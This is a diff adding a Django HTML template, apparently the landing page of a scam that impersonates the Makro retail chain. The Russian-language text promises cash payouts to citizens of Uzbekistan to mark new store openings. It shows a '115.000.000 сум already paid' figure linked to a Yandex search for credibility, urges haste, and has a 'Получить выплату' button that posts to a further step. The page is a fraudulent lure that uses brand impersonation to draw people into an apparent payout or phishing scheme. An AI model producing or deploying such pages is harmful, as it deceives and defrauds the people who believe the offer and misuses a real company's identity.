@@ -1,0 +1,23 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+<head>
+      <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+  <title>Главная</title>
+  <link rel="stylesheet" type="text/css" href="{% static 'main/css/main.css' %}">
+</head>
+<body>
+  <div class="container">
+    <img class="logo" src="{% static 'main/img/makro-logo.png'%}" alt="">
+    <h1>Акция "Поехали!"</h1>
+    <p>В связи с открытием новых сетевых точек магазина в Узбекистане,<br>команда «Makro» приняла решение о произведении выплат гражданам для увеличения количества покупателей и покупательной способности.<br>Выплату вы можете получить на этом сайте, перейдя по кнопке ниже на окно получения.</p>
+    <br><br><p><b>Makromarket</b> выплатил уже более <a href="https://yandex.ru/search/?text=115+000+000+%D1%81%D1%83%D0%BC+%D0%B2+%D1%80%D1%83%D0%B1%D0%BB%D1%8F%D1%85&clid=2411726&lr=11056" target="_blank" style="color: green; font-weight: 800;">115.000.000</a> сум, успей и ты!</p>
+    <form style="width: 100%;" method="post">
+      {% csrf_token %}
+      <button id="continue" name="continue-button" class="continue-button">Получить выплату</button>
+    </form>
+
+  </div>
+</body>
+</html>
